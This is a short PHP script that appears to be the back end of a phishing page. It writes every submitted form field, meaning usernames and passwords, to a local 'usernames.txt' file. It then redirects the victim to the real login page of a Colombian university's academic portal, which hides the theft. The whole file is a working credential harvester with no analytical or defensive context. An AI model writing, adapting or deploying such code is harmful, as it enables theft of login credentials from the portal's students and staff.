<?php

header
('location:');
$handle=fopen("usernames.txt", "a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"-");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header('Location: https://sigaacademico.unisabana.edu.co/psp/CS90PRO/?&cmd=login&languageCd=ESP/');
exit();
?>
